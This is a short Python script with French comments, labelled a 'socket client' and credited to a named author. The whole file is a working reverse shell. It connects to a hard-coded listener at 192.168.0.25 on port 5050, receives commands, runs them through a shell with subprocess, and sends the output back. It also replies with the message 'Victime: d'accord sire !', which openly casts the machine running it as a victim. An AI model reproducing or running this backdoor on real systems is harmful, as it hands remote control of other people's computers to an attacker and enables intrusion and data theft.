#!/usr/bin/env python
# -*- coding: utf-8 -*-

#################################################
#Auteur: Vikrant SINGH                          #
#Programme: Socket-client                       #
#                                               #
#################################################


#################################################
#####################Imports#####################

import socket
import subprocess

#################################################

def commande_recus():
	commande = client_toserver.recv(2048)
	commande_sys = subprocess.Popen(commande, stdout=subprocess.PIPE, shell=True)
	sortie, erreur = commande_sys.communicate()
	client_toserver.send(sortie)
	print (commande)


def envoi_confirm():
	client_toserver.send ("Victime: d'accord sire !")


hote= "192.168.0.25"
port= 5050

client_toserver = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
client_toserver.connect((hote,port))
print ("connexion OK ")

message= " "

while message != 'stop':
	commande_recus()
	envoi_confirm()
